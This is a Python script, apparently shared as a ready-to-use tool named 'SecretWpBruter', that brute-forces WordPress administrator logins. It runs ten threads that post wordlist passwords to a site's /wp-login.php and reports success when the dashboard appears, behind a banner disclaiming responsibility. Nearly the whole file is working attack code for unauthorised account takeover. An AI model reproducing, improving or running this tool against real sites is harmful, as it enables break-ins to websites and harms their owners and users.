import requests
import sys
import threading
import queue

print('''
             _.-````'-,_                                   
   _,.,_ ,-'`           `'-.,_                             
 /)     (\                   '``-.                         
((      ) )                      `\              𝗦𝗲𝗰𝗿𝗲𝘁𝗪𝗽𝗕𝗿𝘂𝘁𝗲𝗿
 \)    (_/                        )\        𝗰𝗼𝗱𝗲𝗱 𝗯𝘆 𝗖𝗖𝘀𝗹𝗮𝘆𝗲𝗿𝟭𝟬𝟬𝟭
  |       /)           '    ,'    / \                      
  `\    ^'            '     (    /  ))                     
    |      _/\ ,     /    ,,`\   (  "`   𝗪𝗼𝗿𝗱𝗽𝗿𝗲𝘀𝘀 𝗕𝗿𝘂𝘁𝗲𝗙𝗼𝗿𝗰𝗲 𝗧𝗼𝗼𝗹               
     \Y,   |  \  \  | ````| / \_ \                         
       `)_/    \  \  )    ( >  ( >                         
                \( \(     |/   |/                          
               /_(/_(    /_(  /_(    *𝗱𝗼𝗻'𝘁 𝘁𝗮𝗸𝗶𝗻𝗴 𝗮𝗻𝘆 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗶𝗹𝗶𝘁𝘆*
''')

print('Warning!!! Web Site need to have "/wp-login.php" and you just need to past site url for example "https://example.com/"\n')

class PasswordCracker(threading.Thread):
    def __init__(self, username, url, wp_login, password_queue, success_queue, tried_passwords_queue, proxies):
        threading.Thread.__init__(self)
        self.username = username
        self.url = url
        self.wp_login = wp_login
        self.password_queue = password_queue
        self.success_queue = success_queue
        self.tried_passwords_queue = tried_passwords_queue
        self.proxies = proxies

    def run(self):
        session = requests.Session()
        session.proxies.update(self.proxies)

        while True:
            try:
                password = self.password_queue.get(timeout=1)
            except queue.Empty:
                break

            data = {
                "log": self.username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": self.url
            }

            response = session.post(self.wp_login, data=data)

            # Her bir şifre denendiğinde, bu şifrenin hangi yüzde aralığında olduğu
            # hesaplanır ve ekrana yazdırılır.
            self.tried_passwords_queue.put(password.strip())
            tried_passwords_count = self.tried_passwords_queue.qsize()
            password_percentage = tried_passwords_count / total_passwords * 100
            print(f"[+] {password_percentage:.2f}% ({tried_passwords_count}/{total_passwords}) Completed.")

            if "Dashboard" in response.text:
                self.success_queue.put(password)

def main():
    username = input('Wordpress Admin Username: ')
    url = input("Site URL: ")
    wp_login = url + "/wp-login.php"
    wordlist = input("Wordlist: ")
    proxy_list = input("Proxy List: ")

    with open(wordlist, "r") as f:
        passwords = f.readlines()

    with open(proxy_list, "r") as f:
        proxies = f.readlines()

    global total_passwords
    total_passwords = len(passwords)

    password_queue = queue.Queue()
    success_queue = queue.Queue()
    tried_passwords_queue = queue.Queue()

    for password in passwords:
        password_queue.put(password.strip())

    threads = []
    num_threads = 10

    for i in range(num_threads):
        t = PasswordCracker(username, url, wp_login, password_queue, success_queue, tried_passwords_queue, {})
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    while not success_queue.empty():
        print("[+] Password Found: " + success_queue.get())
        sys.exit(0)

    print("\n[-] Password Not Found")

if __name__ == "__main__":
    main()
